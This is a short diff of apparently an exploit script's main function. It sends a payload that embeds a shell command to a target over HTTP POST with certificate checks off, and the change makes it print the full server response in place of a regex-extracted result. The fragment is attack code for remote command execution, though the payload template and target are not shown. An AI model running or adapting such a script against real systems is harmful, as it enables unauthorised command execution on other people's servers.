@@ -43,7 +43,7 @@ def exp():
             payload = basic_payload.format(cmd_shell)
             response = requests.post(target, data=payload, headers=headers, timeout=3, verify=False)
             output = re.search(r'([^<]*)', response.text)[0]
-            print(output)
+            print(response.text)
 
 
 if __name__ == '__main__':
